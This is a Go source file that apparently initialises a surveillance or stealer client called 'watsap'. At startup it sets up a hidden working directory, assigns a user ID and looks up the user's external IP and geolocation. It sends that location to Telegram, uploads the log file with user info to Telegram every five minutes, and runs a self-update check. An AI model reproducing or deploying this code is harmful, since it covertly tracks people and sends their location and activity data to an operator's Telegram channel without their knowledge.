package wainit

import (
	"os"
	"time"
	"watsap/plugins/geoip"
	"watsap/plugins/update"
	"watsap/utils/config"
	"watsap/utils/logger"
	"watsap/utils/messages"
	"watsap/utils/secure"
	"watsap/utils/telegram"
)

// workdir setup
func WorkDir() {
	if _, err := os.ReadDir(config.WaDir); err != nil {
		os.MkdirAll(config.WaDir, 0755)
	}
	// change working directory
	os.Chdir(config.WaDir)
}

func SendLogToTG() {
	// send log to telegram periodically if logging or debug mode is enabled
	if config.WaLogging || config.DebugMode {
		for {
			telegram.TgSendFile(config.LogFile, messages.GetUserInfoMsg())
			time.Sleep(5 * time.Minute)
		}
	}
}

func InitWa() {
	WorkDir()           // set working directory
	config.InitConfig() // decode config variables and set DebugMode/WaLogging
	logger.InitLogger() // initialize centralized logger
	InitUserID()        // assign user ID
	secure.SSLPinning() // perform SSL Pinning verification
	geoip.GetIP()       // get user external IP address and geo location
	geoip.SendGeoToTG() // send user geo location to telegram
	go SendLogToTG()    // send log to telegram
	go update.WatsapUpdate() // check for updates asynchronously
}

